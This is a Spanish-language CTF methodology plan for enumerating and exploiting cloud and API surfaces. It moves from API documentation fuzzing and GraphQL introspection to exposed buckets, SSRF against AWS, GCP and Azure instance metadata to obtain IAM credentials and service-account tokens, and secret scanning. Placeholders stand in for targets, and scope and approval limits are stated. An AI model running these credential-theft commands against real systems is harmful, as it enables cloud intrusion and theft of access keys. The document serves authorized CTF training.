# Plan de análisis 14 — Nube y APIs

- **Punto de vista:** Atacante externo o con acceso limitado que enumera superficies cloud y APIs (endpoints REST/GraphQL, documentación Swagger/OpenAPI, buckets de almacenamiento, metadatos de instancia alcanzables vía SSRF, credenciales IAM filtradas) y encadena hallazgos hasta la bandera.
- **Cuándo aplicarlo:** Cuando el reto expone un dominio o aplicación que habla con una API, descarga recursos de un bucket, tiene un parámetro que hace peticiones salientes (URL, webhook, importación, PDF/imagen remota) o cuando aparecen claves/tokens en código, repositorios o artefactos. Si no hay indicios de cloud ni de API, este plan no aporta y conviene priorizar otros.

> **Convención de este documento.** [V] = verificado en fuente primaria consultada en la fecha de redacción (2026-11-26). [NV] = no verificado (procedente de conocimiento general o de un resultado de búsqueda no leído completo); probar antes de usar. Los comandos usan marcadores `<HOST>`, `<BUCKET>`, `<APP>`, etc. que se sustituyen solo con objetivos incluidos en `ctf/SCOPE.md`.

## Preparación

1. **Alcance:** confirmar que el objetivo figura en `ctf/SCOPE.md` antes de cualquier petición. Anotar dominios, IPs, cuentas cloud y buckets autorizados. Todo lo que no esté listado queda fuera.
2. **Carpeta de trabajo y evidencia:** crear una carpeta por objetivo (p. ej. `evidencias/<reto>/`) con subcarpetas `enum/`, `api/`, `cloud/`, `creds/`. Guardar cada salida con su comando y marca de tiempo.
3. **Wordlists:** SecLists (rutas API, nombres de buckets) y wordlists de rutas de Assetnote usadas por kiterunner [V: kiterunner usa datasets de especificaciones Swagger y wordlists compiladas]. Mantener copias locales para no depender de red en el momento.
4. **Herramientas instaladas y versiones registradas:** `aws --version` (IMDSv2 requiere AWS CLI ≥ 1.16.289 [V]), `ffuf -V`, `kr version` (según build), `nuclei -version`, `trufflehog --version`.
5. **Cuentas y credenciales de prueba:** usar siempre dos cuentas de prueba del propio reto para validar BOLA/IDOR. Nunca usar credenciales de terceros fuera del alcance.
6. **Entorno Windows:** en PowerShell, `curl` es un alias de `Invoke-WebRequest`. Usar **`curl.exe`** para los ejemplos de este plan, o WSL/Kali. Las variables se fijan con `$env:NOMBRE="valor"`.
7. **Límites de tasa:** fijar concurrencia baja (`-t 10` en ffuf, `-x`/`-j` bajos en kiterunner) para no tumbar el reto ni disparar bloqueos de WAF.

## Herramientas

| Herramienta | Para qué | Nativo Windows / Kali-WSL |
|---|---|---|
| `curl` | Peticiones manuales a endpoints, metadatos, token de IMDS, listados de buckets | Windows: `curl.exe` incluido en Windows 10/11 [NV]. Kali/WSL: nativo |
| `awscli` (v2) | Listar buckets/objetos sin firma (`--no-sign-request`), `sts get-caller-identity` con claves | Windows: instalador MSI oficial [NV]. Kali: paquete oficial |
| `gcloud` / `gsutil` | Acceso a GCS y validación de cuentas de servicio | Windows: instalador del SDK [NV]. Kali: paquete oficial |
| `az` (Azure CLI) | Consultas a Azure Storage/IMDS con sesión | Windows: MSI [NV]. Kali: paquete oficial |
| `cloud_enum` | Enumeración OSINT multi-nube de buckets, apps y recursos (AWS, Azure, GCP) | Ambos, Python con `uv` [V: `uv tool install git+https://github.com/initstring/cloud_enum`]. Proyecto indicado como poco mantenido, se migra a plantillas Nuclei [V] |
| `s3scanner` | Comprobar si un bucket S3 (y otros proveedores) existe y es accesible | Binario Go; Windows y Linux [NV]. README verificado [V] |
| `ffuf` | Fuzzing de rutas, parámetros y cabeceras con `FUZZ` | Binario Go en Windows y Linux [V: repositorio oficial; instalación en Windows NV] |
| `kiterunner` (`kr`) | Descubrimiento de endpoints de API guiado por especificaciones Swagger, con métodos y parámetros correctos | Binario en Releases; compilación con `make build` en Linux [V]. Windows: no verificado |
| `nuclei` | Plantillas de exposición de APIs, Swagger, configuraciones erróneas | Binario en Windows y Linux [NV] |
| `trufflehog` | Búsqueda de secretos en git, sistemas de archivos y verificación de credenciales | Binario en Windows y Linux [NV] |
| `gitleaks` | Búsqueda de secretos en repositorios y ficheros, alternativa a trufflehog | Binario en Windows y Linux [NV] |
| `enumerate-iam` / Pacu / PMapper | Enumerar permisos IAM de unas claves autorizadas | Python; mejor en Kali/WSL [NV] |
| `jq` | Procesar JSON de Swagger, respuestas de ffuf y GraphQL | Windows: binario [NV]. Kali: nativo |
| Navegador + Burp/ZAP | Inspeccionar llamadas a la API, modificar cabeceras y cuerpos | Ambos [NV] |

## Procedimiento paso a paso

**Paso 1. Identificar el proveedor y los hosts de la superficie.**
```
nslookup <HOST>
curl.exe -sI https://<HOST>/
```
Qué hace: obtiene la resolución DNS y las cabeceras (`Server`, `X-Powered-By`, `Via`, `X-Amz-*`). Los CNAME hacia `*.s3.amazonaws.com`, `*.blob.core.windows.net` o `storage.googleapis.com` indican almacenamiento cloud. Consultar también el plan 07 (OSINT) para subdominios.

**Paso 2. Buscar documentación de la API expuesta.**
```
ffuf -w <WORDLIST_DOCS> -u https://<HOST>/FUZZ -mc 200,301,302,401,403 -fc 404 -t 10 -o enum/docs.json
```
Qué hace: prueba rutas típicas de documentación (`swagger.json`, `openapi.json`, `v3/api-docs`, `api-docs`, `swagger-ui`, `graphql`). Lista de rutas: los nombres anteriores son habituales [NV]; cargarlos desde SecLists. `-mc` define los códigos que se muestran y `-fc 404` descarta los que no existen [V: sintaxis de ffuf].

Verificar una ruta concreta:
```
curl.exe -s https://<HOST>/openapi.json -o enum/openapi.json
```
Qué hace: descarga la especificación para análisis offline. Luego extraer rutas y métodos:
```
jq -r '.paths | to_entries[] | .key as $p | .value | keys[] | "\(.|ascii_upcase) \($p)"' enum/openapi.json
```
Qué hace: lista `MÉTODO /ruta` desde la especificación OpenAPI. Requiere estructura OpenAPI 3 (clave `paths`) [NV en sintaxis exacta; probar].

**Paso 3. Introspección GraphQL.**
```
curl.exe -s -X POST https://<HOST>/graphql -H "Content-Type: application/json" -d "{\"query\":\"{ __schema { queryType { name } mutationType { name } types { name fields { name } } } }\"}" -o api/schema.json
```
Qué hace: pide el esquema completo. Si la introspección está activa, revela consultas y mutaciones ocultas. Si devuelve error, probar variantes (`__typename`) para confirmar que el endpoint es GraphQL [NV: patrón de consulta estándar de GraphQL].

**Paso 4. Descubrir endpoints no documentados con kiterunner.**
```
kr scan https://<HOST> -w <RUTA>/routes.kite -x 10 -j 20 --ignore-length=<N>
```
Qué hace: prueba rutas con los métodos y cuerpos correctos según especificaciones Swagger. `-w` usa wordlist compilada; `-x`/`-j` limitan conexiones [V: sintaxis en README]. `--ignore-length` filtra respuestas de tamaño constante (páginas genéricas). Alternativa: `-A <nombre-assetnote>:<N>` para wordlists incorporadas [V: `-A` documentado; nombre exacto de la lista, NV].

**Paso 5. Fuzzing de rutas y parámetros de API.**
```
ffuf -w <WORDLIST_API>:FUZZ -u https://<HOST>/api/v1/FUZZ -H "Authorization: Bearer <TOKEN_PRUEBA>" -mc 200,201,204,401,403 -fs <TAMANO_404> -t 10 -o api/ffuf-api.json
```
Qué hace: buscar recursos `api/v1/<recurso>` con token de prueba. `-fs` elimina la respuesta de "no existe" por tamaño [V: `-fs` documentado]. Para parámetros ocultos, usar `-u "https://<HOST>/api/v1/items?FUZZ=test" -w params.txt`.

**Paso 6. Escaneo de exposiciones con nuclei.**
```
nuclei -u https://<HOST> -t http/exposures/ -t http/misconfiguration/ -severity low,medium,high,critical -rl 20 -o enum/nuclei.txt
```
Qué hace: busca Swagger/GraphQL/archivos expuestos y configuraciones erróneas con plantillas públicas. `-rl` limita peticiones por segundo. Rutas de plantillas [NV: comprobar con `nuclei -tl` en la versión instalada].

**Paso 7. Enumerar buckets de almacenamiento.**

Descubrimiento por palabra clave (OSINT):
```
cloud_enum -k <PALABRA_CLAVE> -k <DOMINIO_SIN_TLD> -qs -l cloud/cloud_enum.txt
```
Qué hace: genera variantes de nombres de buckets, apps y recursos de AWS, Azure y GCP y comprueba cuáles existen [V: flags `-k`, `-qs`, `-l`].

Comprobar un bucket S3 concreto:
```
s3scanner -bucket <BUCKET>
```
Qué hace: indica si el bucket existe y su permiso de lectura/escritura [V: sintaxis en README; el resultado depende de la versión].

Listado sin credenciales en AWS S3:
```
aws s3 ls s3://<BUCKET>/ --no-sign-request --recursive
aws s3 cp s3://<BUCKET>/<RUTA> cloud/ --no-sign-request
```
Qué hace: lista y descarga objetos sin firmar. `--no-sign-request` impide cargar credenciales [V: flag documentado en AWS CLI].

Listado en GCS y Azure Blob (sin credenciales):
```
curl.exe -s https://storage.googleapis.com/<BUCKET>/
curl.exe -s "https://<CUENTA>.blob.core.windows.net/<CONTENEDOR>?restype=container&comp=list"
```
Qué hace: consulta anónima. Un XML o listado indica acceso público de lectura; `403`/`AccessDenied` indica que existe pero no es público [NV en el formato exacto de respuestas; verificar en el reto].

**Paso 8. Probar SSRF hacia metadatos de instancia.**
Localizar primero el parámetro que hace peticiones salientes (`url=`, `image=`, `webhook=`) y probar:
```
curl.exe -s "https://<APP>/fetch?url=http://169.254.169.254/latest/meta-data/"
```
Qué hace: si la app devuelve el índice de metadatos, hay SSRF hacia IMDS. Según la configuración, IMDSv1 responde a GET directo, mientras que IMDSv2 exige token [V: documentación de AWS].

Con IMDSv2, el token se obtiene con PUT y se envía en GET (ejemplo de la documentación de AWS):
```
TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/
```
Qué hace: primero obtiene la sesión y luego consulta metadatos [V]. En un SSRF que solo permite GET, este paso falla; hay que buscar otro vector (cabeceras controlables, redirección, etc.) [V: la documentación de AWS y el blog de AWS describen las limitaciones de IMDSv2 frente a SSRF].

Credenciales del rol IAM de la instancia (la ruta sigue el nombre del rol devuelto por el índice `iam/security-credentials/`):
```
curl.exe -s "https://<APP>/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
curl.exe -s "https://<APP>/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROL>"
```
Qué hace: obtiene `AccessKeyId`, `SecretAccessKey` y `Token` temporal [V: estructura de rutas en documentación de IMDS; nombre exacto de la ruta de credenciales NV].

GCP (cabecera obligatoria):
```
curl.exe -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
```
Qué hace: devuelve un token OAuth2 de la cuenta de servicio por defecto [V: cabecera y ruta según documentación de Google Cloud].

Azure (cabecera `Metadata: true`):
```
curl.exe -s -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=<VERSION_API>"
```
Qué hace: metadatos de la VM. La versión de `api-version` debe tomarse de la documentación vigente [NV: valor exacto no verificado en esta sesión].

**Paso 9. Buscar credenciales expuestas en código, historial y artefactos.**
```
trufflehog git file://<RUTA_REPO> --only-verified
trufflehog filesystem <RUTA_DIRECTORIO>
gitleaks detect -s <RUTA_REPO> -v --report-path creds/gitleaks.json
```
Qué hace: busca secretos en historial git y ficheros; `--only-verified` (trufflehog) intenta validar las credenciales contra el proveedor, lo que solo debe hacerse con claves dentro del alcance [NV en flags exactos; verificar con `--help`].

**Paso 10. Validar y acotar las claves IAM encontradas.**
```
aws sts get-caller-identity --profile <PERFIL_RETO>
aws iam list-attached-user-policies --user-name <USUARIO> --profile <PERFIL_RETO>
```
Qué hace: primero confirma la identidad (`Account`, `Arn`) y después revisa políticas propias. `sts get-caller-identity` no requiere permisos especiales [V: comando de AWS CLI; comportamiento estándar].

Enumeración de permisos de forma automatizada (opcional):
```
enumerate-iam.py --access-key <AK> --secret-key <SK> --region <REGION>
```
Qué hace: prueba acciones IAM de forma no destructiva para mapear permisos [NV: nombre y sintaxis del script según el repositorio; verificar antes].

**Paso 11. Documentar y registrar cada hallazgo.** Anotar: endpoint o recurso, comando exacto, respuesta (recortada), código de estado y si el acceso fue de lectura, escritura o solo de existencia. Esto alimenta la fase de explotación.

## Qué buscar (indicadores de vulnerabilidad)

- **Documentación expuesta:** `swagger.json`, `openapi.json`, `api-docs` o interfaz Swagger UI accesible sin autenticación. Rutas con métodos marcados como `DELETE`, `PUT` o `admin` sin esquema de seguridad.
- **GraphQL:** introspección activa en producción; mutaciones no referenciadas en el front; campos con `password`, `token`, `secret`, `internal`.
- **Autorización de APIs (OWASP API Top 10 2023):** BOLA/IDOR (API1: cambiar `id` por el de otra cuenta de prueba), autenticación rota (API2), exposición de propiedades sensibles (API3), autorización a nivel de función (API5), SSRF (API7), configuración incorrecta (API8), inventario inadecuado de versiones antiguas (API9) [V: lista en la página de OWASP].
- **Almacenamiento:** listado anónimo (`200` con XML/JSON de objetos), escritura pública, ficheros de configuración o backups (`.env`, `.bak`, `.sql`, `.zip`) dentro del bucket.
- **Metadatos:** respuesta de `169.254.169.254` o `metadata.google.internal` desde una petición que controla el atacante; IMDSv1 habilitado (GET sin token responde); rol IAM con permisos amplios.
- **Credenciales:** claves con prefijo `AKIA`/`ASIA` (AWS), tokens en cabeceras o `.env` en repositorios, claves de servicio JSON de GCP en ficheros.
- **Errores que revelan:** `AccessDenied` frente a `NoSuchBucket` (indica si el bucket existe), ARN o nombres de cuenta en mensajes de error.

## Cómo interpretar y pasar a explotación

1. **Confirmar antes de explotar.** Un `403` en un bucket indica que existe pero no es público; un `401` en una API documentada puede ser un control válido. Reproducir con dos identidades antes de afirmar un fallo.
2. **Cadena típica SSRF → metadatos → IAM → almacenamiento:** (a) SSRF confirmado con respuesta de IMDS; (b) obtener `AccessKeyId`/`SecretAccessKey`/`Token`; (c) exportarlas a un perfil temporal, validar con `sts get-caller-identity`; (d) enumerar permisos; (e) listar y leer buckets o secretos permitidos por la política; (f) buscar la bandera.
3. **Exportar credenciales temporales sin persistirlas en el repo.** Usar `$env:AWS_ACCESS_KEY_ID`, `$env:AWS_SECRET_ACCESS_KEY`, `$env:AWS_SESSION_TOKEN` solo en la sesión.
4. **BOLA/IDOR en APIs:** con dos cuentas, pedir el recurso de A usando el token de B. Si responde datos, el hallazgo está verificado; registrar la petición exacta.
5. **Mass assignment:** enviar propiedades adicionales (`role`, `isAdmin`, `balance`) en `POST`/`PUT` y comparar la respuesta.
6. **GraphQL:** usar el esquema de la introspección para construir consultas a campos ocultos o mutaciones de administración.
7. **Límites:** detenerse al obtener la bandera o al confirmar el alcance del reto. No realizar acciones destructivas (borrado, sobrescritura de objetos) salvo que el reto lo pida explícitamente.

Todas las acciones de explotación son propuestas pendientes de aprobación del equipo.

## Errores comunes y trampas

- **Probar fuera de alcance:** un subdominio o bucket encontrado por OSINT no es automáticamente del reto. Verificar contra `ctf/SCOPE.md`.
- **`curl` en PowerShell:** es un alias de `Invoke-WebRequest` y cambia las cabeceras y la salida. Usar `curl.exe`.
- **Confundir "existe" con "público":** un bucket que responde `403` existe; `404`/`NoSuchBucket` indica que no existe. Ninguno de los dos prueba lectura.
- **IMDSv2 con hop limit:** el token PUT tiene por defecto un hop limit de 1 y las peticiones de contenedores pueden fallar [V: documentación de AWS]. Un fallo de conexión no prueba que IMDS esté bloqueado.
- **Credenciales de entorno que pisan `--no-sign-request`:** si el perfil de la máquina tiene claves, el comando puede firmarse igual. Limpiar `AWS_PROFILE` y variables antes de probar acceso anónimo [NV: comportamiento según configuración; verificar].
- **Falsos positivos de wordlists:** ffuf y kiterunner devuelven respuestas de tamaño constante para páginas genéricas. Filtrar por tamaño (`-fs`, `--ignore-length`) antes de concluir.
- **Rate limit y WAF:** concurrencia alta provoca bloqueos que parecen fallos de la API. Reducir `-t`, `-x`, `-j`, `-rl`.
- **Claves revocadas o temporales:** los tokens de IMDS caducan (TTL máximo 6 h [V]). Renovar antes de cada fase.
- **Herramientas abandonadas:** cloud_enum se indica como poco mantenido [V]; contrastar con nuclei u otras fuentes actuales.
- **Ruido en logs:** las peticiones de enumeración quedan en logs del proveedor. En CTF es aceptable, pero debe anotarse.

## Fuentes

- AWS, configuración de IMDS (IMDSv1/v2, PUT de token, cabeceras, hop limit): https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html [V]
- AWS Security Blog, defensa en profundidad frente a SSRF y EC2 IMDS: https://aws.amazon.com/blogs/security/defense-in-depth-open-firewalls-reverse-proxies-ssrf-vulnerabilities-ec2-instance-metadata-service/ [citado desde resultados de búsqueda; no leído completo]
- AWS CLI, opciones globales (`--no-sign-request`, `--profile`): https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-options.html [V]
- Google Cloud, consulta de metadatos (`Metadata-Flavor: Google`, ruta de token de cuenta de servicio): https://docs.cloud.google.com/compute/docs/metadata/querying-metadata [V]
- Microsoft Learn, Azure Instance Metadata Service: https://learn.microsoft.com/en-us/azure/virtual-machines/instance-metadata-service [consultado; extracto recibido sin confirmar cabecera ni versión de API]
- OWASP API Security Top 10 2023: https://api-security.owasp.org/editions/2023/en/0x11-t10 [V]
- cloud_enum (README: uso, flags, instalación): https://github.com/initstring/cloud_enum [V]
- kiterunner (README: `kr scan`, `-w`, `-A`, `-x`, `-j`): https://github.com/assetnote/kiterunner [V]
- ffuf (README: `FUZZ`, `-mc`, `-fc`, `-fs`): https://github.com/ffuf/ffuf [V]
- S3Scanner (README: `-bucket`, `-bucket-file`, `-enumerate`, proveedores): https://github.com/sa7mon/S3Scanner [V]
- HackTricks, SSRF en cloud (referencia general; redirección no seguida): https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf.html [NV: no leído]
- Datadog Security Labs, robo de credenciales de rol de EC2 vía IMDS (resultado de búsqueda): https://securitylabs.datadoghq.com/cloud-security-atlas/attacks/stealing-ec2-instance-role-credentials [NV: no leído completo]
- hackingthe.cloud, SSRF a metadatos EC2 (resultado de búsqueda): https://hackingthe.cloud/aws/exploitation/ec2-metadata-ssrf/ [NV: no leído completo]
- Pendientes de verificar en fuente primaria: trufflehog, gitleaks, nuclei (plantillas y flags), enumerate-iam, Pacu, PMapper, SecLists.

## Relación con otros planes

- **Plan 07 (OSINT y reconocimiento):** fuente de subdominios, nombres de empresa y palabras clave para `cloud_enum` y la búsqueda de buckets.
- **Plan 02 (red y conexiones):** confirma puertos y servicios antes de fuzzear; relevante si la API escucha en puertos no estándar.
- **Plan 05 (bases de datos y consultas):** si la API o el bucket da acceso a datos, el análisis de consultas y bases de datos continúa aquí.
- **Otros planes** (`analisis/`): este plan no cubre aplicaciones web clásicas (inyecciones, XSS), que deben cruzarse con los planes de web si existen en el repositorio.

## Autorización

- Este plan es metodología genérica. No investiga ni ataca ningún objetivo concreto.
- Su aplicación exige que el objetivo figure en un `ctf/SCOPE.md` confirmado. Sin ese archivo, no se ejecuta ninguna de las acciones de este documento.
- No usar credenciales, buckets, cuentas o dominios de terceros, ni datos reales de personas.
- Las recomendaciones y cadenas de explotación son propuestas pendientes de aprobación del equipo y del supervisor del CTF.
